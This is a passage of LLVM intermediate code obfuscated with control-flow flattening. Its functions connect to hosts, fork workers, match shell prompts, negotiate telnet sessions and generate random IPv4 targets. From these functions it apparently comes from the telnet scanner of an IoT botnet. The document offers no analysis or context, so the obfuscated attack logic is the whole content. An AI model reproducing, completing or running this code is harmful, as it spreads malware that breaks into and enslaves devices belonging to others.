loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1499925298, label %first
    i32 -1112378075, label %38
    i32 -67183761, label %39
    i32 876865276, label %51
    i32 1538639137, label %56
    i32 847117790, label %61
    i32 1827334192, label %70
    i32 -140617829, label %87
    i32 1359805369, label %94
    i32 -2110236776, label %95
    i32 1783311476, label %96
    i32 713604341, label %97
    i32 15220586, label %98
    i32 2107469108, label %99
    i32 -1108939719, label %100
    i32 2047992333, label %109
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %36 = icmp ne i32 %.reload, 0
  %37 = select i1 %36, i32 -1112378075, i32 -67183761
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 2047992333, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %41 = getelementptr inbounds [8 x i8], [8 x i8]* %40, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 8, i32 4, i1 false)
  %42 = load i32, i32* %6, align 4
  %43 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %44 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  store %struct.sockaddr* %44, %struct.sockaddr** %43, align 8
  %45 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %46 = load %struct.sockaddr*, %struct.sockaddr** %45, align 8
  %47 = call i32 @connect(i32 %42, %struct.sockaddr* %46, i32 16)
  store i32 %47, i32* %16, align 4
  %48 = load i32, i32* %16, align 4
  %49 = icmp slt i32 %48, 0
  %50 = select i1 %49, i32 876865276, i32 -1108939719
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = call i32* @__errno_location() #13
  %53 = load i32, i32* %52, align 4
  %54 = icmp eq i32 %53, 115
  %55 = select i1 %54, i32 1538639137, i32 15220586
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i32, i32* %9, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %58, i64* %59, align 8
  %60 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %60, align 8
  store i32 847117790, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %63 = getelementptr inbounds [16 x i64], [16 x i64]* %62, i64 0, i64 0
  %64 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %63) #2, !srcloc !4
  %65 = extractvalue { i64, i64* } %64, 0
  %66 = extractvalue { i64, i64* } %64, 1
  %67 = trunc i64 %65 to i32
  store i32 %67, i32* %18, align 4
  %68 = ptrtoint i64* %66 to i64
  %69 = trunc i64 %68 to i32
  store i32 %69, i32* %19, align 4
  store i32 1827334192, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i32, i32* %6, align 4
  %72 = srem i32 %71, 64
  %73 = zext i32 %72 to i64
  %74 = shl i64 1, %73
  %75 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %76 = load i32, i32* %6, align 4
  %77 = sdiv i32 %76, 64
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds [16 x i64], [16 x i64]* %75, i64 0, i64 %78
  %80 = load i64, i64* %79, align 8
  %81 = or i64 %80, %74
  store i64 %81, i64* %79, align 8
  %82 = load i32, i32* %6, align 4
  %83 = add nsw i32 %82, 1
  %84 = call i32 @select(i32 %83, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %85 = icmp sgt i32 %84, 0
  %86 = select i1 %85, i32 -140617829, i32 1783311476
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %88 = load i32, i32* %6, align 4
  %89 = bitcast i32* %14 to i8*
  %90 = call i32 @getsockopt(i32 %88, i32 1, i32 4, i8* %89, i32* %13) #2
  %91 = load i32, i32* %14, align 4
  %92 = icmp ne i32 %91, 0
  %93 = select i1 %92, i32 1359805369, i32 -2110236776
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 2047992333, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 713604341, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 2047992333, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 2107469108, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 2047992333, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  store i32 -1108939719, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = load i32, i32* %6, align 4
  %102 = call i32 (i32, i32, ...) @fcntl(i32 %101, i32 3, i8* null)
  %103 = sext i32 %102 to i64
  store i64 %103, i64* %15, align 8
  %104 = load i64, i64* %15, align 8
  %105 = and i64 %104, -2049
  store i64 %105, i64* %15, align 8
  %106 = load i32, i32* %6, align 4
  %107 = load i64, i64* %15, align 8
  %108 = call i32 (i32, i32, ...) @fcntl(i32 %106, i32 4, i64 %107)
  store i32 1, i32* %5, align 4
  store i32 2047992333, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i32, i32* %5, align 4
  ret i32 %110

loopEnd:                                          ; preds = %100, %99, %98, %97, %96, %95, %94, %87, %70, %61, %56, %51, %39, %38, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -425129747, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -425129747, label %first
    i32 -1758687835, label %9
    i32 -2141259736, label %11
    i32 -1353656260, label %20
    i32 -602137593, label %26
    i32 1111082701, label %36
    i32 1333368799, label %39
    i32 -1670606028, label %50
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp sle i32 %.reload, 0
  %8 = select i1 %7, i32 -1758687835, i32 -2141259736
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 -1670606028, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* @numpids, align 4
  %13 = add nsw i32 %12, 1
  store i32 %13, i32* @numpids, align 4
  %14 = load i32, i32* @numpids, align 4
  %15 = add nsw i32 %14, 1
  %16 = mul nsw i32 %15, 4
  %17 = sext i32 %16 to i64
  %18 = call noalias i8* @malloc(i64 %17) #2
  %19 = bitcast i8* %18 to i32*
  store i32* %19, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 -1353656260, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = load i32, i32* @numpids, align 4
  %23 = sub nsw i32 %22, 1
  %24 = icmp slt i32 %21, %23
  %25 = select i1 %24, i32 -602137593, i32 1333368799
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @pids, align 8
  %28 = load i32, i32* %4, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 1111082701, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 -1353656260, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i32, i32* @numpids, align 4
  %43 = sub nsw i32 %42, 1
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i32, i32* %41, i64 %44
  store i32 %40, i32* %45, align 4
  %46 = load i32*, i32** @pids, align 8
  %47 = bitcast i32* %46 to i8*
  call void @free(i8* %47) #2
  %48 = load i32*, i32** %3, align 8
  store i32* %48, i32** @pids, align 8
  %49 = load i32, i32* %2, align 4
  store i32 %49, i32* %1, align 4
  store i32 -1670606028, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* %1, align 4
  ret i32 %51

loopEnd:                                          ; preds = %39, %36, %26, %20, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.310, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 -637679040, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -637679040, label %11
    i32 -142052434, label %18
    i32 268539705, label %19
    i32 -1974745927, label %24
    i32 -1436577838, label %37
    i32 -271292361, label %50
    i32 216508190, label %63
    i32 -1664954443, label %75
    i32 -990616728, label %76
    i32 -1640242768, label %78
    i32 -108444911, label %81
    i32 -1983184337, label %100
    i32 -2103782640, label %101
    i32 1673482428, label %102
    i32 -1074650619, label %105
    i32 -2000926144, label %106
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  %17 = select i1 %16, i32 -142052434, i32 -1074650619
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 268539705, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %5, align 4
  %21 = load i32, i32* %7, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = select i1 %22, i32 -1974745927, i32 -990616728
  store i32 %23, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %3, align 8
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = sub i64 0, %30
  %32 = getelementptr inbounds i8, i8* %28, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  %36 = select i1 %35, i32 -1664954443, i32 -1436577838
  store i32 %36, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, %43
  %45 = getelementptr inbounds i8, i8* %41, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 -1664954443, i32 -271292361
  store i32 %49, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 13
  %62 = select i1 %61, i32 -1664954443, i32 216508190
  store i32 %62, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8*, i8** %3, align 8
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i32, i32* %7, align 4
  %69 = sext i32 %68 to i64
  %70 = sub i64 0, %69
  %71 = getelementptr inbounds i8, i8* %67, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 10
  store i32 -1664954443, i32* %switchVar
  store i1 %74, i1* %.reg2mem
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -990616728, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %77 = select i1 %.reload3, i32 -1640242768, i32 -108444911
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %7, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %7, align 4
  store i32 268539705, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8*, i8** %3, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i32, i32* %7, align 4
  %87 = sext i32 %86 to i64
  %88 = sub i64 0, %87
  %89 = getelementptr inbounds i8, i8* %85, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = load i8*, i8** %4, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = sext i8 %96 to i32
  %98 = icmp eq i32 %91, %97
  %99 = select i1 %98, i32 -1983184337, i32 -2103782640
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -2000926144, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 1673482428, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %6, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %6, align 4
  store i32 -637679040, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -2000926144, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  ret i32 %107

loopEnd:                                          ; preds = %105, %102, %101, %100, %81, %78, %76, %75, %63, %50, %37, %24, %19, %18, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  %switchVar = alloca i32
  store i32 -1396279234, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1396279234, label %33
    i32 -1802600488, label %39
    i32 2099248688, label %44
    i32 -364001876, label %48
    i32 1125676625, label %49
    i32 -598495021, label %51
    i32 -2139035604, label %52
    i32 -1713467157, label %61
    i32 -799438367, label %78
    i32 -734549995, label %79
    i32 1364546636, label %91
    i32 -73278911, label %95
    i32 -54232050, label %96
    i32 -1645671757, label %105
    i32 465121843, label %114
    i32 1797906204, label %118
    i32 1398342198, label %119
    i32 -1238142942, label %128
    i32 264891008, label %129
    i32 1735437827, label %130
    i32 -1002859426, label %136
    i32 -677906879, label %140
    i32 477936895, label %145
    i32 -1789412105, label %146
    i32 516479839, label %147
    i32 -1203269075, label %148
    i32 -363882447, label %152
    i32 1165604838, label %153
    i32 -1794487438, label %154
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  %38 = select i1 %37, i32 -1802600488, i32 1125676625
  store i32 %38, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %41 = load i64, i64* %40, align 8
  %42 = icmp sgt i64 %41, 0
  %43 = select i1 %42, i32 -364001876, i32 2099248688
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %46 = load i64, i64* %45, align 8
  %47 = icmp sgt i64 %46, 0
  store i32 -364001876, i32* %switchVar
  store i1 %47, i1* %.reg2mem
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 1125676625, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %50 = select i1 %.reload3, i32 -598495021, i32 -1203269075
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 -2139035604, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %54 = getelementptr inbounds [16 x i64], [16 x i64]* %53, i64 0, i64 0
  %55 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %54) #2, !srcloc !5
  %56 = extractvalue { i64, i64* } %55, 0
  %57 = extractvalue { i64, i64* } %55, 1
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %24, align 4
  %59 = ptrtoint i64* %57 to i64
  %60 = trunc i64 %59 to i32
  store i32 %60, i32* %25, align 4
  store i32 -1713467157, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %10, align 4
  %63 = srem i32 %62, 64
  %64 = zext i32 %63 to i64
  %65 = shl i64 1, %64
  %66 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %67 = load i32, i32* %10, align 4
  %68 = sdiv i32 %67, 64
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [16 x i64], [16 x i64]* %66, i64 0, i64 %69
  %71 = load i64, i64* %70, align 8
  %72 = or i64 %71, %65
  store i64 %72, i64* %70, align 8
  %73 = load i32, i32* %10, align 4
  %74 = add nsw i32 %73, 1
  %75 = call i32 @select(i32 %74, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %76 = icmp slt i32 %75, 1
  %77 = select i1 %76, i32 -799438367, i32 -734549995
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 -1203269075, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %15, align 8
  %81 = load i32, i32* %18, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  store i8* %83, i8** %23, align 8
  %84 = load i32, i32* %10, align 4
  %85 = load i8*, i8** %23, align 8
  %86 = call i64 @recv(i32 %84, i8* %85, i64 1, i32 0)
  %87 = trunc i64 %86 to i32
  store i32 %87, i32* %19, align 4
  %88 = load i32, i32* %19, align 4
  %89 = icmp eq i32 %88, -1
  %90 = select i1 %89, i32 -73278911, i32 1364546636
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %19, align 4
  %93 = icmp eq i32 %92, 0
  %94 = select i1 %93, i32 -73278911, i32 -54232050
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1794487438, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %19, align 4
  %98 = load i32, i32* %18, align 4
  %99 = add nsw i32 %98, %97
  store i32 %99, i32* %18, align 4
  %100 = load i8*, i8** %23, align 8
  %101 = load i8, i8* %100, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 255
  %104 = select i1 %103, i32 -1645671757, i32 1735437827
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %10, align 4
  %107 = load i8*, i8** %23, align 8
  %108 = getelementptr inbounds i8, i8* %107, i64 1
  %109 = call i64 @recv(i32 %106, i8* %108, i64 2, i32 0)
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %19, align 4
  %111 = load i32, i32* %19, align 4
  %112 = icmp eq i32 %111, -1
  %113 = select i1 %112, i32 1797906204, i32 465121843
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %19, align 4
  %116 = icmp eq i32 %115, 0
  %117 = select i1 %116, i32 1797906204, i32 1398342198
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1794487438, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i32, i32* %19, align 4
  %121 = load i32, i32* %18, align 4
  %122 = add nsw i32 %121, %120
  store i32 %122, i32* %18, align 4
  %123 = load i32, i32* %10, align 4
  %124 = load i8*, i8** %23, align 8
  %125 = call i32 @negotiate(i32 %123, i8* %124, i32 3)
  %126 = icmp ne i32 %125, 0
  %127 = select i1 %126, i32 264891008, i32 -1238142942
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1794487438, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 516479839, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i8*, i8** %15, align 8
  %132 = load i8*, i8** %11, align 8
  %133 = call i8* @strstr(i8* %131, i8* %132) #10
  %134 = icmp ne i8* %133, null
  %135 = select i1 %134, i32 477936895, i32 -1002859426
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i32, i32* %12, align 4
  %138 = icmp ne i32 %137, 0
  %139 = select i1 %138, i32 -677906879, i32 -1789412105
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i8*, i8** %15, align 8
  %142 = call i32 @matchPrompt(i8* %141)
  %143 = icmp ne i32 %142, 0
  %144 = select i1 %143, i32 477936895, i32 -1789412105
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  store i32 -1203269075, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 516479839, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  store i32 -1396279234, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %20, align 4
  %150 = icmp ne i32 %149, 0
  %151 = select i1 %150, i32 -363882447, i32 1165604838
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  store i32 -1794487438, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1794487438, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i32, i32* %9, align 4
  ret i32 %155

loopEnd:                                          ; preds = %153, %152, %148, %147, %146, %145, %140, %136, %130, %129, %128, %119, %118, %114, %105, %96, %95, %91, %79, %78, %61, %52, %51, %49, %48, %44, %39, %33, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getDatIP() #0 {
  %1 = alloca [4 x i8], align 1
  %2 = alloca [16 x i8], align 16
  %3 = bitcast [4 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %3, i8 0, i64 4, i32 1, i1 false)
  %4 = call i32 @rand() #2
  %5 = srem i32 %4, 255
  %6 = trunc i32 %5 to i8
  %7 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  store i8 %6, i8* %7, align 1
  %8 = call i32 @rand() #2
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  %11 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  store i8 %10, i8* %11, align 1
  %12 = call i32 @rand() #2
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  %15 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  store i8 %14, i8* %15, align 1
  %16 = call i32 @rand() #2
  %17 = srem i32 %16, 255
  %18 = trunc i32 %17 to i8
  %19 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  store i8 %18, i8* %19, align 1
  %switchVar = alloca i32
  store i32 -1576105203, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
